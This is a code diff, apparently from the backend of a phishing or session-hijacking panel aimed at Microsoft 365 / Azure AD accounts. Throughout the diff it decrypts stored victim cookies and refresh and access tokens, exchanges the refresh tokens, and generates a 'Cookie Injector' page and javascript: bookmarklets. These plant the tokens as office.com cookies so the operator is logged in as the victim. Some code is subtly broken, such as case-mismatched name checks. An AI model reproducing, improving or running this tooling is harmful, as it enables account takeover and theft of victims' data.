-          nameLower === 'SPOExtensionSDK' || nameLower.indexOf('sposrs') !== -1 ||
-          nameLower.indexOf('sharepoint') !== -1) {
-        return '.sharepoint.com';
-      }
-
-      if (nameLower === 'TEAMSSESSION' || nameLower === 'MSFT' ||
-          nameLower.indexOf('teams') !== -1 || nameLower === 'TSTC') {
-        return '.teams.microsoft.com';
-      }
-
-      if (nameLower === 'fpc' || nameLower === 'bms' ||
-          nameLower === 'BMC' || nameLower === 'MSF' ||
-          nameLower === 'MSFPC' || nameLower === 'WAFF' ||
-          nameLower === 'ANON' || nameLower === '_ana' ||
-          nameLower === '_gat' || nameLower === '_gid') {
-        return '.microsoft.com';
-      }
-
-      if (nameLower === 'Loginportal' || nameLower === 'AADBRS' ||
-          nameLower === 'AADBPA' || nameLower === 'STSSSSID' ||
-          nameLower.indexOf('lobsrc') !== -1) {
-        return '.login.microsoftonline.com';
-      }
-
-      if (accountType === 'personal') {
-        return '.login.live.com';
-      }
-      return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
-    },
-    getDomain: function(cookieName) {
-      return this._getDomain(cookieName);
+      script += '\\nconsole.log("Cookies injected! Press F5 to refresh.");';
+      return script;
     }
-  };
-
-  return domainMap;
+  </script>
+</body>
+</html>`;
 }
 
-// ─── Generate Cookie Injection Page ────────────────────────────────
-function generateInjectPage(cookies, clientId, tenant) {
-  // Store as parallel arrays for safe JavaScript embedding
-  var cookieData = {
-    names: [],
-    values: [],
-    domains: []
-  };
-  for (var i = 0; i < cookies.length; i++) {
-    cookieData.names.push(cookies[i].name);
-    cookieData.values.push(cookies[i].value);
-    cookieData.domains.push(cookies[i].domain || '');
-  }
-  
-  // Base64 encode the cookie data to prevent any special character issues
-  var cookieDataJson = JSON.stringify(cookieData);
-  var cookieDataB64 = Buffer.from(cookieDataJson).toString('base64');
+// =========================================================
+// API: Bookmarklet Generator (FIXED)
+// GET /api/tokens/bookmarklet/:id
+// =========================================================
 
-  var baseDomain = tenant && tenant !== 'common' ? '.' + tenant + '.login.microsoftonline.com' : '.login.microsoftonline.com';
-
-  // Build auth URL - use https://www.office.com/ as redirect_uri since it's commonly registered
-  var authUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=' + clientId + '&response_type=code&redirect_uri=https%3A%2F%2Fwww.office.com%2F&scope=openid+profile+email+offline_access';
-  var navTargets = [
-    authUrl,
-    'https://login.microsoftonline.com/',
-    'https://www.office.com/'
-  ];
-
-  var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
-  html += '  <meta charset="UTF-8">\n';
-  html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
-  html += '  <title>VGenius Cookie Injector</title>\n';
-  html += '  <style>\n';
-  html += '    * { margin: 0; padding: 0; box-sizing: border-box; }\n';
-  html += '    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 20px; max-width: 900px; margin: 0 auto; background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%); color: #e0e0e0; min-height: 100vh; }\n';
-  html += '    h1 { color: #00ccff; margin-bottom: 20px; font-size: 24px; }\n';
-  html += '    .info-box { background: rgba(0, 204, 255, 0.1); border: 1px solid rgba(0, 204, 255, 0.3); border-radius: 8px; padding: 16px; margin-bottom: 20px; }\n';
-  html += '    .info-box p { margin: 4px 0; font-size: 14px; }\n';
-  html += '    .info-box strong { color: #00ccff; }\n';
-  html += '    button { padding: 14px 28px; cursor: pointer; background: linear-gradient(135deg, #00ccff, #0099cc); color: #000; border: none; border-radius: 8px; font-weight: bold; font-size: 15px; margin: 8px 5px; transition: all 0.2s; }\n';
-  html += '    button:hover { background: linear-gradient(135deg, #00aacc, #0088bb); transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0, 204, 255, 0.3); }\n';
-  html += '    button:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }\n';
-  html += '    .btn-secondary { background: linear-gradient(135deg, #666, #444); color: #fff; }\n';
-  html += '    .btn-secondary:hover { background: linear-gradient(135deg, #777, #555); }\n';
-  html += '    .status { margin-top: 20px; padding: 14px; border-radius: 8px; font-family: "Courier New", monospace; font-size: 13px; line-height: 1.6; }\n';
-  html += '    .info { background: rgba(0, 150, 255, 0.1); border: 1px solid rgba(0, 150, 255, 0.3); color: #4db8ff; }\n';
-  html += '    .success { background: rgba(0, 255, 100, 0.1); color: #0f0; border: 1px solid rgba(0, 255, 100, 0.3); }\n';
-  html += '    .error { background: rgba(255, 50, 50, 0.1); color: #ff4444; border: 1px solid rgba(255, 50, 50, 0.3); }\n';
-  html += '    .progress { background: rgba(255, 200, 0, 0.1); color: #ffcc00; border: 1px solid rgba(255, 200, 0, 0.3); }\n';
-  html += '    .cookie-list { max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px; margin: 10px 0; font-size: 12px; }\n';
-  html += '    .cookie-item { padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }\n';
-  html += '    .actions { margin-top: 15px; }\n';
-  html += '  </style>\n';
-  html += '</head>\n<body>\n';
-  html += '  <h1>\ud83d\udd11 VGenius Cookie Injector</h1>\n';
-  html += '  <div class="info-box">\n';
-  html += '    <p><strong>Cookies Ready:</strong> <span id="cookieCount">' + cookies.length + '</span></p>\n';
-  html += '    <p><strong>Target:</strong> Microsoft 365 / Azure AD</p>\n';
-  html += '    <p><strong>Instructions:</strong> Click a button below to inject cookies and login.</p>\n';
-  html += '  </div>\n';
-  html += '  <div class="cookie-list" id="cookieList"></div>\n';
-  html += '  <div class="actions">\n';
-  html += '    <button onclick="startInjection()" id="injectBtn">\ud83d\ude80 Inject Cookies & Login</button>\n';
-  html += '    <button onclick="copyCookies()" class="btn-secondary">\ud83d\udccb Copy Cookie String</button>\n';
-  html += '    <button onclick="openDirect()" class="btn-secondary">\ud83d\udd17 Open Microsoft Directly</button>\n';
-  html += '  </div>\n';
-  html += '  <div id="status"></div>\n'; 
-  html += '  <script>\n';
- // ── Suppress Microsoft Clarity & Centro console noise ──────────────
-  // These errors are cosmetic (analytics/feature-flag services) and
-  // appear whenever many cookies are present on Microsoft pages. 
-  html += '    // Suppress Clarity tag-limit &400 errors\n';
-  html += '    (function suppressClarityErrors() {\n';
-  html += '      var origError = console.error;\n';
-  html += '      var origWarn = console.warn;\n';
-  html += '      var origLog = console.log;\n';
-  html += '      var suppressed = 0;\n';
-  html += '      console.error = function() {\n';
-  html += '        var args = Array.prototype.slice.call(arguments);\n';
-  html += '        var msg = args.join(" ");\n';
-  html += '        if (typeof msg === "string" && (\n';
-  html += '          msg.indexOf("clarity.ms") !== -1 ||\n';
-  html += '          msg.indexOf("clarity") !== -1 ||\n';
-  html += '          msg.indexOf("Microsoft Clarity tag limit") !== -1 ||\n';
-  html += '          msg.indexOf("Attempted to set") !== -1 && msg.indexOf("Clarity tags") !== -1 ||\n';
-  html += '          msg.indexOf("net::ERR_ABORTED") !== -1 && msg.indexOf("clarity") !== -1\n';
-  html += '        )) {\n';
-  html += '          suppressed++;\n';
-  html += '          return;\n';
-  html += '        }\n';
-  html += '        return origError.apply(console, arguments);\n';
-  html += '      };\n';
-  html += '      // Restore original console after 10 seconds\n';
-  html += '      setTimeout(function() {\n';
-  html += '        console.error = origError;\n';
-  html += '        if (suppressed > 0) {\n';
-  html += '          console.warn("[CookieInjector] Suppressed " + suppressed + " Clarity console errors.");\n';
-  html += '        }\n';
-  html += '      }, 10000);\n';
-  html += '    })();\n';
-  html += '\n';
-  
-  // FIX: Use base64 encoding to safely embed cookie data with special characters
-  html += '    var cookieDataB64 = "' + cookieDataB64 + '";\n';
-  html += '    var cookieData = JSON.parse(atob(cookieDataB64));\n';
-  html += '    var cookieNames = cookieData.names;\n';
-  html += '    var cookieValues = cookieData.values;\n';
-  html += '    var cookieDomains = cookieData.domains;\n';
-  html += '    var targetUrl = "' + navTargets[0].replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/'/g, "\\'") + '";\n';
-  html += '    var baseDomain = "' + baseDomain + '";\n';
-  html += '\n';
-  html += '    // Display cookie list\n';
-  html += '    (function displayCookies() {\n';
-  html += '      var list = document.getElementById("cookieList");\n';
-  html += '      var listHtml = "";\n';
-  html += '      for (var i = 0; i < cookieNames.length; i++) {\n';
-  html += '        var shortVal = cookieValues[i].length > 30 ? cookieValues[i].substring(0, 30) + "..." : cookieValues[i];\n';
-  html += '        listHtml += "<div class=\\"cookie-item\\"><strong>" + cookieNames[i] + "</strong> = " + shortVal + "...</div>\\n";\n';
-  html += '      }\n';
-  html += '      list.innerHTML = listHtml;\n';
-  html += '    })();\n';
-  html += '\n';
-  html += '    // Build cookie injection statements safely\n';
-  html += '    function buildCookieScript() {\n';
-  html += '      var script = "";\n';
-  html += '      for (var i = 0; i < cookieNames.length; i++) {\n';
-  html += '        var domain = cookieDomains[i] || baseDomain;\n';
-  html += '        var encodedValue = encodeURIComponent(cookieValues[i]);\n';
-  html += '        script += \'document.cookie = "\' + cookieNames[i] + "=" + encodedValue + \'; domain=\' + domain + \'; path=/; Secure; SameSite=None\\";\\n\';\n';
-  html += '      }\n';
-  html += '      return script;\n';
-  html += '    }\n';
-  html += '\n';
-  html += '    // Build full cookie string for copying\n';
-  html += '    function buildCookieString() {\n';
-  html += '      var parts = [];\n';
-  html += '      for (var i = 0; i < cookieNames.length; i++) {\n';
-  html += '        parts.push(cookieNames[i] + "=" + cookieValues[i]);\n';
-  html += '      }\n';
-  html += '      return parts.join("; ");\n';
-  html += '    }\n';
-  html += '\n';
-  html += '    function setStatus(msg, type) {\n';
-  html += '      var el = document.getElementById("status");\n';
-  html += '      el.className = "status " + type;\n';
-  html += '      el.innerHTML = msg;\n';
-  html += '    }\n';
-  html += '\n';
-  html += '    function startInjection() {\n';
-  html += '      var btn = document.getElementById("injectBtn");\n';
-  html += '      btn.disabled = true;\n';
-  html += '      setStatus("STEP 1: A new tab will open to Office.com. Wait for it to load completely.", "progress");\n';
-  html += '      \n';
-  html += '      // Step 1: Open Office.com in a new tab\n';
-  html += '      var newTab = window.open("https://www.office.com/", "_blank");\n';
-  html += '      \n';
-  html += '      if (!newTab) {\n';
-  html += '        setStatus("Popup blocked! Please allow popups for this site and try again.", "error");\n';
-  html += '        btn.disabled = false;\n';
-  html += '        return;\n';
-  html += '      }\n';
-  html += '      \n';
-  html += '      setStatus("STEP 2: Wait for Office.com to load in the new tab...", "progress");\n';
-  html += '      \n';
-  html += '      // Step 2: After delay, inject cookies into the new tab via stored script\n';
-  html += '      setTimeout(function() {\n';
-  html += '        try {\n';
-  html += '          // Build cookie injection script\n';
-  html += '          var script = buildCookieScript();\n';
-  html += '          \n';
-  html += '          // Try to eval in the popup - works if same origin or if popup is us\n';
-  html += '          try {\n';
-  html += '            newTab.eval(script);\n';
-  html += '            newTab.eval("window.location.reload(true);");\n';
-  html += '            setStatus("STEP 3: Cookies injected! The new tab should now be logged in.", "success");\n';
-  html += '          } catch(e2) {\n';
-  html += '            // Cross-origin - show the script for manual execution\n';
-  html += '            showManualScript(newTab, script);\n';
-  html += '          }\n';
-  html += '        } catch(e) {\n';
-  html += '          setStatus("Error during injection: " + e.message, "error");\n';
-  html += '          btn.disabled = false;\n';
-  html += '        }\n';
-  html += '      }, 3000);\n';
-  html += '    }\n';
-  html += '    \n';
-  html += '    function showManualScript(popupTab, script) {\n';
-  html += '      var stepHtml = "";\n';
-  html += '      stepHtml += \'<div style="text-align:left; padding:10px">\';\n';
-  html += '      stepHtml += \'<p style="color:#ffcc00; font-weight:bold; margin:10px 0">STEP 2 (Required): In the new Office.com tab:</p>\';\n';
-  html += '      stepHtml += \'<ol style="text-align:left; margin-left:20px; line-height:2">\';\n';
-  html += '      stepHtml += \'<li>Press <strong>F12</strong> to open DevTools</li>\';\n';
-  html += '      stepHtml += \'<li>Go to <strong>Console</strong> tab</li>\';\n';
-  html += '      stepHtml += \'<li>Paste the code below and press <strong>Enter</strong>:</li>\';\n';
-  html += '      stepHtml += \'<textarea style="width:90%;height:150px;font-size:10px;font-family:monospace;margin:10px 0;background:#111;color:#0f0" id="manualScript">\' + script + \'</textarea>\';\n';
-  html += '      stepHtml += \'<button id="copyBtn" style="margin:10px 0">Copy Script</button>\';\n';
-  html += '      stepHtml += \'<li style="margin-top:10px">Go back to Office.com tab and press <strong>F5</strong> to refresh</li>\';\n';
-  html += '      stepHtml += \'</ol>\';\n';
-  html += '      stepHtml += \'</div>\';\n';
-  html += '      setStatus(stepHtml, "info");\n';
-  html += '      // Attach click handler after inserting HTML\n';
-  html += '      (function attachCopyHandler() {\n';
-  html += '        try {\n';
-  html += '          var btn = document.getElementById("copyBtn");\n';
-  html += '          var ta = document.getElementById("manualScript");\n';
-  html += '          if (btn && ta) {\n';
-  html += '            btn.onclick = function() {\n';
-  html += '              ta.select();\n';
-  html += '              document.execCommand("copy");\n';
-  html += '              btn.textContent = "Copied!";\n';
-             html += ' };\n';
-  html += '          }\n';
-  html += '        } catch(e) {}\n';
-  html += '      })();\n';
-  html += '    }\n'; 
-  html += '\n';
-  html += '    function copyCookies() {\n';
-  html += '      var cookieStr = buildCookieString();\n';
-  html += '      if (navigator.clipboard && navigator.clipboard.writeText) {\n';
-  html += '        navigator.clipboard.writeText(cookieStr).then(function() {\n';
-  html += '          setStatus("Copied " + cookieNames.length + " cookies to clipboard!", "success");\n';
-  html += '        }).catch(function() {\n';
-  html += '          fallbackCopy(cookieStr);\n';
-  html += '        });\n';
-  html += '      } else {\n';
-  html += '        fallbackCopy(cookieStr);\n';
-  html += '      }\n';
-  html += '    }\n';
-  html += '\n';
-  html += '    function fallbackCopy(text) {\n';
-  html += '      var ta = document.createElement("textarea");\n';
-  html += '      ta.value = text;\n';
-  html += '      ta.style.position = "fixed";\n';
-  html += '      ta.style.opacity = "0";\n';
-  html += '      document.body.appendChild(ta);\n';
-  html += '      ta.select();\n';
-  html += '      document.execCommand("copy");\n';
-  html += '      document.body.removeChild(ta);\n';
-  html += '      setStatus("Copied " + cookieNames.length + " cookies to clipboard!", "success");\n';
-  html += '    }\n';
-  html += '\n';
-   html += '    function openDirect() {\n';
-  html += '      // Navigate directly to Office.com (NOT the authorize URL)\n';
-  html += '      window.location.href = "https://www.office.com/";\n';
-  html += '    }\n';
-  html += '  </script>\n';
-  html += '</body>\n</html>';
-
-  return html;
-}
-
-// ─── Bookmarklet Generator ─────────────────────────────────────────
 router.get('/bookmarklet/:id', async (req, res) => {
   try {
     let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
@@ -643,7 +626,7 @@ router.get('/bookmarklet/:id', async (req, res) => {
 
     let decoded;
     try {
-      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
+      decoded = jwt.verify(jwtToken, config.JWT_SECRET);
     } catch (err) {
       return res.status(401).json({ error: 'Invalid or expired token' });
     }
@@ -655,46 +638,64 @@ router.get('/bookmarklet/:id', async (req, res) => {
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
     const token = tokens[0];
-    const cookies = decrypt(token.cookies_encrypted);
-    const accessToken = decrypt(token.access_token_encrypted);
     const refreshToken = decrypt(token.refresh_token_encrypted);
+    const accessToken = decrypt(token.access_token_encrypted);
 
-    if (!cookies && !accessToken && !refreshToken) {
-      return res.status(400).json({ error: 'No tokens available' });
-    }
+    const tenant = token.tenant || config.AZURE_TENANT || 'common';
+    const clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const accountType = token.account_type || 'unknown';
 
-    var tenant = token.tenant || config.AZURE_TENANT || 'common';
-    var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
-    var accountType = token.account_type || 'unknown';
-    var cookiesList = [];
-    if (cookies) {
-      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
-    } else {
-      const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
-      if (accessToken) {
-        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: baseDomain });
+    // If we have a refresh token, exchange it first
+    if (refreshToken) {
+      const exchangeResult = await exchangeRefreshToken(refreshToken, tenant, clientId, accountType);
+      if (exchangeResult.success) {
+        const freshRt = exchangeResult.refresh_token || refreshToken;
+        const rtPayload = JSON.stringify({
+          token_type: 'Bearer',
+          refresh_token: freshRt,
+          expires_in: 1209599,
+        });
+
+        const bookmarklet = 'javascript:(function(){' +
+          'var d=document;' +
+          'var c=document.createElement("cookie");' +
+          '// Setting cookie via document.cookie (runs in current tab context)' +
+          'document.cookie="x-ms-RefreshTokenCredential=' + encodeURIComponent(rtPayload) + '; path=/; Secure";' +
+          'window.location.href="https://www.office.com/";' +
+          '})();';
+
+        return res.json({
+          bookmarklet: bookmarklet,
+          login_url: generateLoginUrl(exchangeResult.access_token, exchangeResult.token_type, tenant, clientId, accountType),
+          method: 'bookmarklet_with_refresh',
+          hint: 'Step 1: Navigate to office.com first. Step 2: Click this bookmarklet to inject tokens and reload.',
+        });
       }
-      if (refreshToken) {
-        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: baseDomain });
-      }
     }
 
-    if (cookiesList.length === 0) return res.status(400).json({ error: 'No cookies available' });
-
-    var bookmarklet = '';
-    for (var i = 0; i < cookiesList.length; i++) {
-      const c = cookiesList[i];
-      bookmarklet += `document.cookie = "${c.name}=${encodeURIComponent(c.value)}; domain=${c.domain}; path=/; Secure; SameSite=None";\n`;
+    // Fallback: use stored access token
+    if (accessToken) {
+      const bookmarklet = 'javascript:(function(){' +
+        'document.cookie="x-ms-RefreshTokenCredential=' +
+        encodeURIComponent(JSON.stringify({
+          token_type: 'Bearer',
+          access_token: accessToken,
+          expires_in: 3600,
+        })) + '; path=/; Secure";' +
+        'window.location.href="https://www.office.com/";     ' +
+        '})();';
+ return res.json({
+        bookmarklet: bookmarklet,
+        login_url: generateLoginUrl(accessToken, 'Bearer', tenant, clientId, accountType),
+        method: 'bookmarklet_with_access_token',
+        warning: 'Using stored access token. May expire quickly.',
+        hint: 'Navigate to office.com, then click this bookmarklet.',
+      });
     }
-    bookmarklet += '\n';
-    bookmarklet += '// Redirect to Office.com after injecting cookies\n';
-    bookmarklet += 'setTimeout(() => {\n';
-    bookmarklet += '  window.location.href = "https://www.office.com/";\n';
-    bookmarklet += '}, 3000);\n';
 
-    res.json({ bookmarklet: bookmarklet, cookies: cookiesList });
+    return res.status(400).json({ error: 'No tokens available for bookmarklet' });
   } catch (err) {
-    console.error('[CookieInject] Bookmarklet error:', err);
+    console.error('[Bookmarklet] Error:', err);
     res.status(500).json({ error: 'Server error' });
   }
 });
